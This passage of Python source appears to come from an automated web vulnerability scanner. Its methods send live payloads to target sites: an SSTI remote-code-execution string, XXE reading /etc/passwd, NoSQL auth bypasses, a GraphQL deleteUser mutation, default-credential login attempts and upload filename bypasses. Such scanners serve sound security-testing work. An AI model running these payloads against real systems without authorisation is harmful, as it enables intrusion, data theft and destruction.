                           "continue", "dest", "destination", "go", "out", "view", "to"}

        for url in targets["urls"][:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in redirect_params:
                    for payload in REDIRECT_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(
                            f"curl -sI -m 10 '{test_url}'",
                            timeout=15,
                        )
                        if r.success:
                            location_match = re.search(r'(?i)^location:\s*(.+)', r.stdout, re.MULTILINE)
                            if location_match:
                                location = location_match.group(1).strip()
                                if "evil.com" in location or payload in location:
                                    f = Finding(
                                        vuln_type="open_redirect",
                                        title=f"Open Redirect: 参数 {param_name}",
                                        url=url,
                                        parameter=param_name,
                                        payload=payload,
                                        evidence=f"重定向到: {location}",
                                        severity="medium",
                                        confidence="confirmed",
                                    )
                                    findings.append(f)
                                    self.findings.append(f)
                                    break

        return findings

    # ---- 目录遍历 ----

    async def _test_dir_traversal(self, targets: dict) -> list[Finding]:
        """目录遍历检测"""
        findings = []
        file_params = {"file", "path", "folder", "dir", "document", "include",
                       "page", "lang", "template", "php_path", "doc", "filepath"}

        for url in targets["urls"][:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in file_params:
                    for payload in DIR_TRAVERSAL_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r.success and re.search(r'root:.*:0:0:', r.stdout):
                            f = Finding(
                                vuln_type="dir_traversal",
                                title=f"目录遍历: 参数 {param_name}",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence="读取到 /etc/passwd 内容",
                                severity="critical",
                                confidence="confirmed",
                            )
                            findings.append(f)
                            self.findings.append(f)
                            return findings

        return findings

    # ---- 命令注入 ----

    async def _test_cmd_injection(self, targets: dict) -> list[Finding]:
        """命令注入检测"""
        findings = []
        input_params = {"cmd", "command", "exec", "ping", "host", "ip", "query",
                        "shell", "run", "system"}

        for url in targets["urls"][:3]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in input_params:
                    for payload, expected in CMD_INJECTION_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        original = test_params[param_name]
                        test_params[param_name] = original + payload

                        method = "GET"
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        if isinstance(expected, int):
                            # Time-based
                            r = await run_command(f"curl -sL -o /dev/null -w '%{{time_total}}' -m {expected + 5} '{test_url}'", timeout=expected + 10)
                            if r.success:
                                try:
                                    elapsed = float(r.stdout.strip())
                                    if elapsed >= expected - 1:
                                        f = Finding(
                                            vuln_type="cmd_injection",
                                            title=f"命令注入 (Time-based): 参数 {param_name}",
                                            url=url, parameter=param_name,
                                            payload=payload,
                                            evidence=f"延迟 {elapsed:.1f}s",
                                            severity="critical", confidence="probable",
                                        )
                                        findings.append(f)
                                        self.findings.append(f)
                                        return findings
                                except ValueError:
                                    pass
                        else:
                            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                            if r.success and re.search(expected, r.stdout):
                                f = Finding(
                                    vuln_type="cmd_injection",
                                    title=f"命令注入: 参数 {param_name}",
                                    url=url, parameter=param_name,
                                    payload=payload,
                                    evidence=re.search(expected, r.stdout).group()[:100],
                                    severity="critical", confidence="confirmed",
                                )
                                findings.append(f)
                                self.findings.append(f)
                                return findings

        return findings

    # ---- GraphQL 注入检测 ----

    async def _test_graphql(self, targets: dict) -> list[Finding]:
        """GraphQL 注入和信息泄露检测"""
        findings = []
        graphql_endpoints = []

        # 从 API 端点中筛选 GraphQL 端点
        for ep in targets["api_endpoints"]:
            if any(kw in ep.lower() for kw in ["graphql", "gql"]):
                graphql_endpoints.append(ep)

        # 常见 GraphQL 路径
        for url in targets["urls"][:2]:
            base = url.rstrip("/")
            for path in ["/graphql", "/gql", "/graphiql", "/v1/graphql"]:
                ep = f"{base}{path}"
                if ep not in graphql_endpoints:
                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "405"):
                        graphql_endpoints.append(ep)

        for ep in graphql_endpoints[:3]:
            # 1. 内省查询（Introspection）
            introspection_query = '{"query":"{ __schema { types { name fields { name } } } }"}'
            r = await run_command(
                f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{introspection_query}' '{ep}'",
                timeout=15,
            )
            if r.success and "__schema" in r.stdout and "types" in r.stdout:
                # 解析类型数量
                type_count = r.stdout.count('"name"')
                f = Finding(
                    vuln_type="graphql",
                    title=f"GraphQL 内省查询已启用: {ep}",
                    url=ep, parameter="introspection",
                    payload=introspection_query,
                    evidence=f"内省查询返回 {type_count} 个字段定义",
                    severity="medium", confidence="confirmed",
                    poc=f"curl -X POST -H 'Content-Type: application/json' -d '{introspection_query}' {ep}",
                )
                findings.append(f)
                self.findings.append(f)

                # 2. 检查敏感类型
                sensitive_types = ["User", "Admin", "Password", "Token", "Secret", "Credential", "Session"]
                for stype in sensitive_types:
                    if f'"{stype}"' in r.stdout or f"'{stype}'" in r.stdout:
                        f = Finding(
                            vuln_type="graphql",
                            title=f"GraphQL 暴露敏感类型: {stype}",
                            url=ep, parameter="schema",
                            evidence=f"内省响应中包含类型 {stype}",
                            severity="high", confidence="probable",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        break

            # 3. GraphQL 注入测试
            injection_payloads = [
                '{"query":"{ user(id: \\"1 OR 1=1\\") { id email } }"}',
                '{"query":"{ user(id: null) { id email } }"}',
                '{"query":"mutation { deleteUser(id: \\"1\\") { id } }"}',
            ]
            for payload in injection_payloads:
                r = await run_command(
                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
                    timeout=15,
                )
                if r.success:
                    resp = r.stdout.lower()
                    if any(kw in resp for kw in ["error", "sql", "syntax", "exception", "stack"]):
                        if "sql" in resp or "syntax" in resp:
                            f = Finding(
                                vuln_type="sqli",
                                title=f"GraphQL SQL 注入: {ep}",
                                url=ep, parameter="query",
                                payload=payload,
                                evidence=r.stdout[:200],
                                severity="critical", confidence="probable",
                                poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
                            )
                            findings.append(f)
                            self.findings.append(f)
                            return findings

            # 4. Batching 攻击（批量查询绕过速率限制）
            batch_payload = json.dumps([
                {"query": "{ user(id: 1) { id email } }"},
                {"query": "{ user(id: 2) { id email } }"},
                {"query": "{ user(id: 3) { id email } }"},
            ])
            r = await run_command(
                f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{batch_payload}' '{ep}'",
                timeout=15,
            )
            if r.success and r.stdout.startswith("["):
                try:
                    batch_results = json.loads(r.stdout)
                    if isinstance(batch_results, list) and len(batch_results) > 1:
                        f = Finding(
                            vuln_type="graphql",
                            title=f"GraphQL Batching 攻击: {ep}",
                            url=ep, parameter="batch query",
                            payload=batch_payload,
                            evidence=f"批量查询返回 {len(batch_results)} 个结果，可绕过速率限制",
                            severity="medium", confidence="confirmed",
                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{batch_payload}' {ep}",
                        )
                        findings.append(f)
                        self.findings.append(f)
                except json.JSONDecodeError:
                    pass

            # 5. 深度查询 DoS 测试（嵌套查询）
            deep_query = '{"query":"{ __typename ...on Query { __typename ...on Query { __typename ...on Query { __typename } } } }"}'
            r = await run_command(
                f"curl -sL -m 15 -X POST -H 'Content-Type: application/json' -d '{deep_query}' '{ep}'",
                timeout=20,
            )
            if r.success and r.timed_out is False and len(r.stdout) > 1000:
                f = Finding(
                    vuln_type="graphql",
                    title=f"GraphQL 深度查询可能未限制: {ep}",
                    url=ep, parameter="query depth",
                    payload=deep_query,
                    evidence=f"深度查询返回 {len(r.stdout)} bytes",
                    severity="medium", confidence="possible",
                )
                findings.append(f)
                self.findings.append(f)

        return findings

    # ---- JWT 攻击检测 ----

    async def _test_jwt(self, targets: dict) -> list[Finding]:
        """JWT 令牌安全检测"""
        findings = []

        for url in targets["urls"][:3]:
            # 1. 获取响应头，检查是否有 JWT 相关 Cookie 或 Header
            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
            if not r.success:
                continue

            headers = r.stdout

            # 检查 Set-Cookie 中是否有 token/jwt
            token_cookies = re.findall(
                r'(?i)set-cookie:\s*(token|jwt|auth|session|access_token|id_token)=([^;\s]+)',
                headers,
            )

            # 检查响应体中的 JWT
            body_r = await run_command(f"curl -sL -m 5 '{url}'", timeout=10)
            if body_r.success:
                # 查找 JWT 格式的 token (eyJ...)
                jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
                jwt_matches = re.findall(jwt_pattern, body_r.stdout)

                for token in jwt_matches[:3]:
                    # 解码 JWT header
                    try:
                        import base64
                        header_b64 = token.split(".")[0]
                        header_b64 += "=" * (4 - len(header_b64) % 4)
                        header_json = base64.urlsafe_b64decode(header_b64).decode()
                        header = json.loads(header_json)
                        alg = header.get("alg", "")
                        kid = header.get("kid", "")

                        # 检查 none 算法
                        if alg.lower() == "none":
                            f = Finding(
                                vuln_type="jwt",
                                title="JWT None 算法漏洞",
                                url=url, parameter="alg",
                                payload=f"alg: {alg}",
                                evidence=f"JWT 使用 none 算法，可绕过签名验证",
                                severity="critical", confidence="confirmed",
                                poc=f"修改 JWT header: {{'alg': 'none'}}, 删除签名部分",
                            )
                            findings.append(f)
                            self.findings.append(f)

                        # RS256→HS256 密钥混淆检测
                        elif alg.startswith("RS"):
                            f = Finding(
                                vuln_type="jwt",
                                title=f"JWT RS256→HS256 密钥混淆风险",
                                url=url, parameter="alg",
                                payload=f"原始 alg: {alg}",
                                evidence=f"JWT 使用 {alg}，可用公钥作为 HMAC 密钥伪造 token",
                                severity="high", confidence="possible",
                                poc=f"用公钥作为 HMAC 密钥，将 alg 改为 HS256 签名",
                            )
                            findings.append(f)
                            self.findings.append(f)

                        # 对称算法弱密钥风险
                        elif alg in ("HS256", "HS384", "HS512"):
                            f = Finding(
                                vuln_type="jwt",
                                title=f"JWT 使用对称算法 {alg}（可能被暴力破解）",
                                url=url, parameter="alg",
                                payload=f"alg: {alg}",
                                evidence=f"JWT 使用 {alg}，如果密钥弱可被破解",
                                severity="medium", confidence="possible",
                            )
                            findings.append(f)
                            self.findings.append(f)

                        # kid 参数注入检测
                        if kid:
                            # kid SQL 注入
                            kid_sqli_payloads = [
                                "' UNION SELECT 'key'--",
                                "1 OR 1=1",
                                "null",
                            ]
                            for kid_payload in kid_sqli_payloads:
                                # 构造恶意 JWT（仅测试 header）
                                evil_header = {**header, "kid": kid_payload}
                                evil_header_b64 = base64.urlsafe_b64encode(
                                    json.dumps(evil_header).encode()
                                ).rstrip(b"=").decode()
                                parts = token.split(".")
                                evil_token = f"{evil_header_b64}.{parts[1]}.{parts[2]}"

                                f = Finding(
                                    vuln_type="jwt",
                                    title=f"JWT kid 参数可注入: {kid_payload[:30]}",
                                    url=url, parameter="kid",
                                    payload=f"kid: {kid_payload}",
                                    evidence=f"JWT header 包含 kid 参数，可能存在注入",
                                    severity="high", confidence="possible",
                                    poc=f"修改 kid 为: {kid_payload}",
                                )
                                findings.append(f)
                                self.findings.append(f)
                                break

                    except Exception:
                        pass

        # 2. 测试登录端点获取 JWT
        login_endpoints = []
        for ep in targets["api_endpoints"]:
            if any(kw in ep.lower() for kw in ["login", "auth", "token", "signin"]):
                login_endpoints.append(ep)

        # 常见登录路径
        for url in targets["urls"][:2]:
            base = url.rstrip("/")
            for path in ["/api/login", "/api/auth", "/api/token", "/login", "/auth"]:
                ep = f"{base}{path}"
                if ep not in login_endpoints:
                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "401", "405"):
                        login_endpoints.append(ep)

        # 测试默认凭据
        default_creds = [
            ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
            ("admin@juice-sh.op", "admin123"), ("admin@example.com", "admin"),
            ("test", "test"), ("user", "user"), ("root", "root"),
        ]

        for ep in login_endpoints[:3]:
            for username, password in default_creds[:5]:
                payload = json.dumps({"email": username, "password": password})
                r = await run_command(
                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
                    timeout=15,
                )
                if r.success:
                    resp = r.stdout.lower()
                    # 成功登录通常返回 token
                    if "token" in resp and ("authentication" in resp or "bearer" in resp or "jwt" in resp):
                        f = Finding(
                            vuln_type="auth",
                            title=f"默认凭据可登录: {username}",
                            url=ep, parameter="credentials",
                            payload=f"email={username}&password={password}",
                            evidence="登录成功，返回 authentication token",
                            severity="critical", confidence="confirmed",
                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        return findings  # 找到一个就够了

        return findings

    # ---- CORS 配置检测 ----

    async def _test_cors(self, targets: dict) -> list[Finding]:
        """CORS 配置错误检测"""
        findings = []
        evil_origin = "https://evil.com"

        for url in targets["urls"][:3]:
            # 测试任意 Origin 反射
            r = await run_command(
                f"curl -sI -m 5 -H 'Origin: {evil_origin}' '{url}'",
                timeout=10,
            )
            if not r.success:
                continue

            headers = r.stdout
            acao_match = re.search(r'(?i)^access-control-allow-origin:\s*(.+)', headers, re.MULTILINE)
            acac_match = re.search(r'(?i)^access-control-allow-credentials:\s*(.+)', headers, re.MULTILINE)

            if acao_match:
                acao = acao_match.group(1).strip()
                acac = acac_match.group(1).strip().lower() if acac_match else ""

                # 任意 Origin 反射
                if acao == evil_origin:
                    severity = "critical" if acac == "true" else "high"
                    f = Finding(
                        vuln_type="cors",
                        title=f"CORS 任意 Origin 反射" + ("（含凭据）" if acac == "true" else ""),
                        url=url, parameter="Origin",
                        payload=f"Origin: {evil_origin}",
                        evidence=f"Access-Control-Allow-Origin: {acao}" +
                                 (f", Access-Control-Allow-Credentials: {acac}" if acac else ""),
                        severity=severity, confidence="confirmed",
                        poc=f"curl -I -H 'Origin: {evil_origin}' {url}",
                    )
                    findings.append(f)
                    self.findings.append(f)

                # 通配符 *
                elif acao == "*":
                    if acac == "true":
                        f = Finding(
                            vuln_type="cors",
                            title="CORS 通配符 * 配合 Allow-Credentials",
                            url=url, parameter="Origin",
                            payload="Origin: *",
                            evidence="ACAO: *, ACAC: true（浏览器会阻止，但配置错误）",
                            severity="medium", confidence="confirmed",
                        )
                        findings.append(f)
                        self.findings.append(f)
                    else:
                        f = Finding(
                            vuln_type="cors",
                            title="CORS 通配符 *（允许任意来源）",
                            url=url, parameter="Origin",
                            evidence=f"Access-Control-Allow-Origin: *",
                            severity="low", confidence="confirmed",
                        )
                        findings.append(f)
                        self.findings.append(f)

                # null Origin
                elif acao == "null":
                    r_null = await run_command(
                        f"curl -sI -m 5 -H 'Origin: null' '{url}'", timeout=10,
                    )
                    if r_null.success and "access-control-allow-origin: null" in r_null.stdout.lower():
                        f = Finding(
                            vuln_type="cors",
                            title="CORS 允许 null Origin（可从 iframe 利用）",
                            url=url, parameter="Origin",
                            payload="Origin: null",
                            evidence="Access-Control-Allow-Origin: null",
                            severity="high", confidence="confirmed",
                            poc=f"curl -I -H 'Origin: null' {url}",
                        )
                        findings.append(f)
                        self.findings.append(f)

        # Vary: Origin 缺失检测（缓存投毒风险）
        for url in targets["urls"][:2]:
            r = await run_command(
                f"curl -sI -m 5 -H 'Origin: https://a.com' '{url}'", timeout=10,
            )
            if r.success and "access-control-allow-origin" in r.stdout.lower():
                if "vary" not in r.stdout.lower() or "origin" not in r.stdout.lower():
                    f = Finding(
                        vuln_type="cors",
                        title="CORS 缺少 Vary: Origin（缓存投毒风险）",
                        url=url, parameter="Vary",
                        evidence="响应包含 CORS 头但缺少 Vary: Origin，CDN 可能缓存跨域响应",
                        severity="medium", confidence="probable",
                    )
                    findings.append(f)
                    self.findings.append(f)

        return findings

    # ---- 安全头审计 ----

    async def _test_security_headers(self, targets: dict) -> list[Finding]:
        """HTTP 安全头审计"""
        findings = []

        required_headers = {
            "strict-transport-security": {
                "name": "HSTS",
                "severity": "medium",
                "desc": "未启用 HTTP 严格传输安全，可能遭受 SSL 剥离攻击",
            },
            "content-security-policy": {
                "name": "CSP",
                "severity": "medium",
                "desc": "未设置内容安全策略，增加 XSS 攻击风险",
            },
            "x-content-type-options": {
                "name": "X-Content-Type-Options",
                "severity": "low",
                "desc": "未设置 X-Content-Type-Options，浏览器可能 MIME 嗅探",
            },
            "x-frame-options": {
                "name": "X-Frame-Options",
                "severity": "medium",
                "desc": "未设置 X-Frame-Options，可能遭受点击劫持攻击",
            },
            "x-xss-protection": {
                "name": "X-XSS-Protection",
                "severity": "low",
                "desc": "未设置 XSS 过滤头（现代浏览器已弃用，但仍建议设置）",
            },
            "referrer-policy": {
                "name": "Referrer-Policy",
                "severity": "low",
                "desc": "未设置 Referrer 策略，可能泄露敏感 URL 信息",
            },
            "permissions-policy": {
                "name": "Permissions-Policy",
                "severity": "low",
                "desc": "未设置权限策略，未限制浏览器功能访问",
            },
        }

        for url in targets["urls"][:2]:
            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
            if not r.success:
                continue

            headers_lower = r.stdout.lower()
            missing = []

            for header, info in required_headers.items():
                if header not in headers_lower:
                    missing.append(info)
                    f = Finding(
                        vuln_type="header",
                        title=f"缺失安全头: {info['name']}",
                        url=url, parameter=header,
                        evidence=info["desc"],
                        severity=info["severity"], confidence="confirmed",
                    )
                    findings.append(f)
                    self.findings.append(f)

            # 检查危险头
            if "server:" in headers_lower:
                server_match = re.search(r'(?i)^server:\s*(.+)', r.stdout, re.MULTILINE)
                if server_match:
                    server = server_match.group(1).strip()
                    f = Finding(
                        vuln_type="header",
                        title=f"服务器版本泄露: {server}",
                        url=url, parameter="Server",
                        evidence=f"Server 头暴露: {server}",
                        severity="low", confidence="confirmed",
                    )
                    findings.append(f)
                    self.findings.append(f)

            if "x-powered-by:" in headers_lower:
                powered_match = re.search(r'(?i)^x-powered-by:\s*(.+)', r.stdout, re.MULTILINE)
                if powered_match:
                    powered = powered_match.group(1).strip()
                    f = Finding(
                        vuln_type="header",
                        title=f"技术栈泄露: X-Powered-By: {powered}",
                        url=url, parameter="X-Powered-By",
                        evidence=f"X-Powered-By 头暴露: {powered}",
                        severity="low", confidence="confirmed",
                    )
                    findings.append(f)
                    self.findings.append(f)

        return findings

    # ---- SSTI 模板注入 ----

    async def _test_ssti(self, targets: dict) -> list[Finding]:
        """SSTI 模板注入检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        # 数学探针（不同模板引擎）
        ssti_probes = [
            ("{{7*7}}", "49", "Jinja2/Twig/Mako"),
            ("${7*7}", "49", "FreeMarker/Velocity/OGNL"),
            ("<%= 7*7 %>", "49", "ERB/Ruby"),
            ("#{7*7}", "49", "Slim/Pug"),
            ("{{7*'7'}}", "777", "Jinja2 (string repeat)"),
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param_name in params:
                for payload, expected, engine in ssti_probes:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and expected in r.stdout:
                        f = Finding(
                            vuln_type="ssti",
                            title=f"SSTI 模板注入 ({engine}): 参数 {param_name}",
                            url=url, parameter=param_name,
                            payload=payload,
                            evidence=f"探针 {payload} 返回计算结果 {expected}，引擎: {engine}",
                            severity="critical", confidence="confirmed",
                            poc=test_url,
                        )
                        findings.append(f)
                        self.findings.append(f)

                        # 尝试 RCE payload
                        rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                        test_params[param_name] = rce_payload
                        rce_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                        rce_r = await run_command(f"curl -sL -m 10 '{rce_url}'", timeout=15)
                        if rce_r.success and "uid=" in rce_r.stdout:
                            f2 = Finding(
                                vuln_type="ssti",
                                title=f"SSTI RCE: 参数 {param_name}",
                                url=url, parameter=param_name,
                                payload=rce_payload,
                                evidence=re.search(r'uid=\d+.*', rce_r.stdout).group()[:100],
                                severity="critical", confidence="confirmed",
                                poc=rce_url,
                            )
                            findings.append(f2)
                            self.findings.append(f2)
                        return findings
        return findings

    # ---- NoSQL 注入 ----

    async def _test_nosql(self, targets: dict) -> list[Finding]:
        """NoSQL 注入检测（MongoDB 操作符注入）"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        nosql_payloads = [
            # 认证绕过
            ({"password": {"$ne": ""}}, "认证绕过 ($ne)"),
            ({"password": {"$gt": ""}}, "认证绕过 ($gt)"),
            ({"password": {"$regex": "^.*"}}, "认证绕过 ($regex)"),
            ({"$where": "1==1"}, "JS 执行 ($where)"),
            ({"username": {"$in": ["admin", "root"]}}, "枚举 ($in)"),
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            base = url.rstrip("/")

            # 识别登录/搜索端点
            is_auth_endpoint = any(kw in base.lower() for kw in ["login", "auth", "signin", "search"])
            if not is_auth_endpoint:
                continue

            for payload, desc in nosql_payloads[:3]:
                payload_str = json.dumps(payload)
                r = await run_command(
                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload_str}' '{url}'",
                    timeout=15,
                )
                if r.success and len(r.stdout) > 20:
                    resp = r.stdout.lower()
                    # 检查是否绕过了认证
                    if "token" in resp or "success" in resp or "welcome" in resp:
                        f = Finding(
                            vuln_type="nosqli",
                            title=f"NoSQL 注入: {desc}",
                            url=url, parameter="JSON body",
                            payload=payload_str,
                            evidence=f"端点接受 MongoDB 操作符，响应 {len(r.stdout)} bytes",
                            severity="critical", confidence="probable",
                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload_str}' {url}",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        return findings

            # URL 编码括号变体
            params = parse_qs(parsed.query)
            for param_name in params:
                for op in ["$ne", "$gt", "$regex"]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[f"{param_name}[{op}]"] = "test"
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and len(r.stdout) > 20:
                        if "<!doctype html>" not in r.stdout.lower()[:200]:
                            f = Finding(
                                vuln_type="nosqli",
                                title=f"NoSQL 注入 (URL编码): 参数 {param_name}",
                                url=url, parameter=f"{param_name}[{op}]",
                                payload=f"{param_name}[$op]=value",
                                evidence=f"URL 编码操作符变体返回有效响应",
                                severity="high", confidence="possible",
                                poc=test_url,
                            )
                            findings.append(f)
                            self.findings.append(f)
                            return findings
        return findings

    # ---- XXE 外部实体注入 ----

    async def _test_xxe(self, targets: dict) -> list[Finding]:
        """XXE 检测（JSON→XML 转换 + 外部实体注入）"""
        findings = []
        urls = targets["api_endpoints"]

        xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
        xxe_svg = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'

        for url in urls[:5]:
            # 尝试将 JSON 端点改为 XML 请求
            r = await run_command(
                f"curl -sL -m 10 -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' '{url}'",
                timeout=15,
            )
            if r.success:
                if "root:" in r.stdout or "/bin/bash" in r.stdout or "/sbin/nologin" in r.stdout:
                    f = Finding(
                        vuln_type="xxe",
                        title=f"XXE 文件读取: {url}",
                        url=url, parameter="XML body",
                        payload=xxe_payload[:100],
                        evidence="成功读取 /etc/passwd",
                        severity="critical", confidence="confirmed",
                        poc=f"curl -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' {url}",
                    )
                    findings.append(f)
                    self.findings.append(f)
                    return findings

            # SVG 上传场景
            r2 = await run_command(
                f"curl -sL -m 10 -X POST -H 'Content-Type: image/svg+xml' -d '{xxe_svg}' '{url}'",
                timeout=15,
            )
            if r2.success and ("root:" in r2.stdout or "/bin/bash" in r2.stdout):
                f = Finding(
                    vuln_type="xxe",
                    title=f"XXE (SVG): {url}",
                    url=url, parameter="SVG upload",
                    payload=xxe_svg[:100],
                    evidence="SVG XXE 成功读取文件",
                    severity="critical", confidence="confirmed",
                )
                findings.append(f)
                self.findings.append(f)
                return findings
        return findings

    # ---- 文件上传绕过 ----

    async def _test_upload(self, targets: dict) -> list[Finding]:
        """文件上传绕过检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        # 识别上传端点
        upload_endpoints = []
        for url in urls:
            if any(kw in url.lower() for kw in ["upload", "file", "image", "avatar", "attach"]):
                upload_endpoints.append(url)

        # 常见上传路径
        for url in targets["urls"][:2]:
            base = url.rstrip("/")
            for path in ["/upload", "/api/upload", "/api/files", "/file/upload", "/api/image"]:
                ep = f"{base}{path}"
                if ep not in upload_endpoints:
                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "405", "415"):
                        upload_endpoints.append(ep)

        for ep in upload_endpoints[:3]:
            bypass_names = [
                "test.php.jpg", "test.php%00.jpg", "test.asp;.jpg",
                "test.pHp", "test.php5", "test.phtml", "test.phar",
                "test.jpg.php", "test.jpg;.php", "test.php;.jpg",
            ]
            for name in bypass_names[:5]:
                r = await run_command(
                    f"curl -sL -m 10 -F 'file=@/dev/null;filename={name}' '{ep}'",
                    timeout=15,
                )
                if r.success:
                    resp = r.stdout.lower()
                    if any(kw in resp for kw in ["success", "uploaded", "filename", "path", "url"]):
                        f = Finding(
                            vuln_type="upload",
                            title=f"文件上传绕过: {name}",
                            url=ep, parameter="filename",
                            payload=f"filename: {name}",
                            evidence=f"端点接受了双扩展名/截断文件名",
                            severity="high", confidence="possible",
                            poc=f"curl -F 'file=@shell.php;filename={name}' {ep}",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        return findings
        return findings

    # ---- CRLF 注入 ----

    async def _test_crlf(self, targets: dict) -> list[Finding]:
        """CRLF 注入检测"""
        findings = []
        crlf_payloads = [
            "%0D%0AX-Injected:true",
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "%5Cr%5CnX-Injected:true",
            "%E5%98%8A%E5%98%8DX-Injected:true",
            "\r\nX-Injected:true",
        ]

        for url in targets["urls"][:3]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param_name in params:
                for payload in crlf_payloads[:3]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                    r = await run_command(f"curl -sI -m 10 '{test_url}'", timeout=15)
                    if r.success and "x-injected" in r.stdout.lower():
                        f = Finding(
                            vuln_type="crlf",
                            title=f"CRLF 注入: 参数 {param_name}",
                            url=url, parameter=param_name,
                            payload=payload,
                            evidence="响应头中出现注入的 X-Injected 头",
                            severity="high", confidence="confirmed",
                            poc=test_url,
                        )
                        findings.append(f)
                        self.findings.append(f)
                        return findings
        return findings

    # ---- CSRF 检测 ----

    async def _test_csrf(self, targets: dict) -> list[Finding]:
        """CSRF 检测"""
        findings = []

        for url in targets["urls"][:3]:
            r = await run_command(f"curl -sL -m 10 '{url}'", timeout=15)
            if not r.success:
                continue

            html = r.stdout
            # 检查 Cookie SameSite 属性
            headers_r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
            if headers_r.success:
                cookies = re.findall(r'(?i)set-cookie:\s*.+', headers_r.stdout)
                for cookie in cookies:
                    if "samesite" not in cookie.lower():
                        # 没有 SameSite 属性
                        if any(kw in cookie.lower() for kw in ["session", "token", "auth", "sid"]):
                            f = Finding(
                                vuln_type="csrf",
                                title="Cookie 缺少 SameSite 属性",
                                url=url, parameter="Set-Cookie",
                                evidence=f"Cookie 没有 SameSite 属性: {cookie[:80]}",
                                severity="medium", confidence="confirmed",
                            )
                            findings.append(f)
                            self.findings.append(f)

            # 检查表单是否有 CSRF token
            forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
            for form in forms[:3]:
                has_csrf = bool(re.search(
                    r'(?i)(csrf|xsrf|_token|authenticity_token|__RequestVerificationToken)',
                    form,
                ))
                if not has_csrf:
                    # 检查是否是状态变更表单
                    if re.search(r'(?i)(method\s*=\s*["\']post["\']|type\s*=\s*["\']submit["\'])', form):
                        f = Finding(
                            vuln_type="csrf",
                            title="表单缺少 CSRF Token",
                            url=url, parameter="form",
                            evidence="POST 表单中未发现 CSRF token 字段",
                            severity="medium", confidence="possible",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        break
        return findings

    # ---- LLM 分析 ----

    async def _analyze_findings(self) -> dict[str, Any]:
        """使用 LLM 分析所有发现"""
        findings_summary = [
            {
                "type": f.vuln_type,
                "title": f.title,
                "url": f.url,
                "severity": f.severity,
                "confidence": f.confidence,
                "evidence": f.evidence[:100],
            }
            for f in self.findings
        ]

        prompt = (
            f"以下是针对 {self.ctx.target_domain} 的漏洞扫描结果:\n\n"
            f"{json.dumps(findings_summary, ensure_ascii=False, indent=2)}\n\n"
            "请分析这些发现，评估整体风险等级，并给出修复建议。"
